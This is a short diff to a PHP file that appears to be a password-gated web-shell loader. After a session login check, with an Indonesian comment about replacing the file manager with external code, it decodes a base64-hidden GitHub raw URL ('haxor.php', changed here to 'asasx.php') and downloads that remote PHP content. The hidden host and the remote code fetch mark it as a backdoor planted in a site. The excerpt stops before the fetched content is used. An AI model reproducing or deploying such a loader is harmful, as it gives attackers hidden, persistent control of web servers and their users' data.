@@ -3,7 +3,7 @@ session_start();
 
 if (isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
     // Setelah login, ganti file manager dengan kode eksternal
-    $url = "https://".base64_decode("cmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9pcGF5YmMvbGF3L3JlZnMvaGVhZHMvbWFpbi9oYXhvci5waHA=");
+    $url = "https://".base64_decode("cmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9pcGF5YmMvbGF3L3JlZnMvaGVhZHMvbWFpbi9hc2FzeC5waHA=");
     $content = file_get_contents($url);
 
     if ($content !== false) {
